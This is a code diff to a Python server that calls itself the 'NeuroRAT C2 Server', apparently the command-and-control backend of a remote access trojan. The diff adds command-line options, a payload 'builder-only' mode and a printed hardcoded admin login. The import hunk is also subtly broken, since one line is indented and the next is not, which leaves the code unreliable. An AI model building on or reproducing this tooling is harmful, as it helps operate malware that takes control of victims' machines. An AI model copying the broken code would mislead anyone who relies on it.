@@ -17,6 +17,7 @@ import base64
 import subprocess
 from typing import Dict, Any, List, Optional, Union
 from datetime import datetime
+import argparse
 
 from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
@@ -28,7 +29,7 @@ import uvicorn
 # Add parent directory to import monitor
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 try:
-from server_monitor import NeuroRATMonitor
+    from server_monitor import NeuroRATMonitor
 from api_integration import APIFactory
 except ImportError:
     # Create placeholder classes if modules don't exist
@@ -1397,12 +1398,34 @@ with open("templates/builder.html", "w") as f:
     f.write(builder_html)
 
 if __name__ == "__main__":
-    print("NeuroRAT C2 Server starting...")
-    print(f"- Server URL: http://localhost:{DEFAULT_PORT}")
-    print(f"- Login page: http://localhost:{DEFAULT_PORT}/login")
-    print("Available API integrations:")
-    print(f"- OpenAI API: {'✅ Available' if openai_client.is_available() else '❌ Not configured'}")
-    print(f"- Gemini API: {'✅ Available' if gemini_client.is_available() else '❌ Not configured'}")
-    print(f"- Telegram API: {'✅ Available' if telegram_client.is_available() else '❌ Not configured'}")
-    print("\nPress Ctrl+C to stop the server")
+    # Обработка аргументов командной строки
+    parser = argparse.ArgumentParser(description="NeuroRAT C2 Server")
+    parser.add_argument("--builder-only", action="store_true", help="Запустить только режим билдера без полного сервера")
+    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Порт для запуска сервера (по умолчанию: {DEFAULT_PORT})")
+    args = parser.parse_args()
+    
+    # Обновляем порт, если указан в аргументах
+    if args.port != DEFAULT_PORT:
+        DEFAULT_PORT = args.port
+    
+    if args.builder_only:
+        print("NeuroRAT Builder Mode - только режим билдера")
+        print(f"- Builder URL: http://localhost:{DEFAULT_PORT}/builder")
+        print("Для входа используйте: admin / neurorat")
+        # В режиме только билдера генерируем данные агентов, но отключаем все остальные функции
+        generate_real_data()
+    else:
+        print("NeuroRAT C2 Server starting...")
+        print(f"- Server URL: http://localhost:{DEFAULT_PORT}")
+        print(f"- Login page: http://localhost:{DEFAULT_PORT}/login")
+        print("Available API integrations:")
+        print(f"- OpenAI API: {'✅ Available' if openai_client.is_available() else '❌ Not configured'}")
+        print(f"- Gemini API: {'✅ Available' if gemini_client.is_available() else '❌ Not configured'}")
+        print(f"- Telegram API: {'✅ Available' if telegram_client.is_available() else '❌ Not configured'}")
+        print("\nPress Ctrl+C to stop the server")
+        
+        # Генерируем данные агентов при первом запуске
+        generate_real_data()
+    
+    # Запускаем сервер
     uvicorn.run(app, host="0.0.0.0", port=DEFAULT_PORT) 
